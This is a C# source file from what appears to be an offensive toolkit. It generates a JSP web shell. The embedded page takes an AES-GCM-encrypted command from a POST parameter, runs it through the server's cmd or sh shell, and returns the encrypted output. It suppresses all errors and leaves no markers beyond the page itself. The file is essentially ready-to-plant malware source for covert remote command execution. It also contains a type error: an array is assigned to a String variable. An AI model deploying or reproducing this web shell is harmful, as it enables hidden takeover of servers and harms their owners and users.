namespace Rod.Transport.WebShells;

/// <summary>
/// The Rod-native JSP web shell: one placed page whose only secret is a
/// 256-bit key baked at generation, carrying the sealed family's channel
/// (AES-256-GCM both directions -- the wire half lives in
/// <see cref="RodSealedAdapter"/>; Javax Crypto's GCM takes the tag
/// appended to the ciphertext, the JCE convention). The command runs
/// through the platform's standard process builder with the shell the OS
/// ships. No function-fallback chains and no bypass logic: those belong
/// to out-of-tree tradecraft (architecture.md Sec 13).
/// </summary>
public sealed class RodJspAdapter : RodSealedAdapter
{
    public override string Id => "rod-jsp";
    public override string ScriptLanguage => "jsp";

    protected override (string Prefix, string Suffix) KeyLiteral => ("decode(\"", "\")");

    public override string RenderScript(string credential)
        => Script.Replace(KeyPlaceholder, credential);

    private const string KeyPlaceholder = "__ROD_KEY__";

    // The placed page: decode the key, take the first POST value, split it
    // into nonce and ciphertext‖tag at the fixed offsets, run the decrypted
    // command through the OS shell's process builder, and answer with a
    // fresh nonce sealing the output. One scriptlet, no markers -- the
    // whole footprint is this page and the key in it.
    private const string Script = """
        <%@page import="javax.crypto.Cipher,javax.crypto.spec.GCMParameterSpec,javax.crypto.spec.SecretKeySpec,java.io.*,java.security.SecureRandom,java.util.Base64"%><%try{byte[] k=Base64.getDecoder().decode("__ROD_KEY__");String n=request.getParameterNames().nextElement().toString();byte[] v=Base64.getDecoder().decode(request.getParameter(n));if(v.length>=28){Cipher d=Cipher.getInstance("AES/GCM/NoPadding");d.init(Cipher.DECRYPT_MODE,new SecretKeySpec(k,"AES"),new GCMParameterSpec(128,java.util.Arrays.copyOfRange(v,0,12)));String c=new String(d.doFinal(java.util.Arrays.copyOfRange(v,12,v.length)),"UTF-8");String w=System.getProperty("os.name","").toLowerCase().contains("win")?new String[]{"cmd","/c",c}:new String[]{"sh","-c",c};ProcessBuilder pb=new ProcessBuilder(w);pb.redirectErrorStream(true);Process p=pb.start();p.getOutputStream().close();ByteArrayOutputStream o=new ByteArrayOutputStream();byte[] b=new byte[4096];int r;while((r=p.getInputStream().read(b))>0){o.write(b,0,r);}p.waitFor();byte[] out=o.toByteArray();byte[] nn=new byte[12];new SecureRandom().nextBytes(nn);Cipher e=Cipher.getInstance("AES/GCM/NoPadding");e.init(Cipher.ENCRYPT_MODE,new SecretKeySpec(k,"AES"),new GCMParameterSpec(128,nn));byte[] ct=e.doFinal(out);byte[] all=new byte[12+ct.length];System.arraycopy(nn,0,all,0,12);System.arraycopy(ct,0,all,12,ct.length);response.setContentType("text/plain");response.getOutputStream().write(Base64.getEncoder().encode(all));}}catch(Exception x){}%>
        """;
}
